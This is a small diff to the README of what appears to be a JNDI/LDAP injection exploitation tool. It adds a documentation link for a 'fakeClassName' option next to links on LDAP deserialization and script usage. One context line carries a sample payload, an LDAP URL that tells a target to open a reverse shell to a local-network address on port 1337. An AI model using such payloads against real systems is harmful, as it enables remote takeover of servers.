@@ -91,6 +91,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - [LDAP Deserialization](USAGE.md#ldap-deserialization)
 - [Script](USAGE.md#script)
 - [useReferenceOnly](USAGE.md#usereferenceonly)
+- [fakeClassName](USAGE.md#fakeclassname)
 
 ## ⚙️ 编译
 
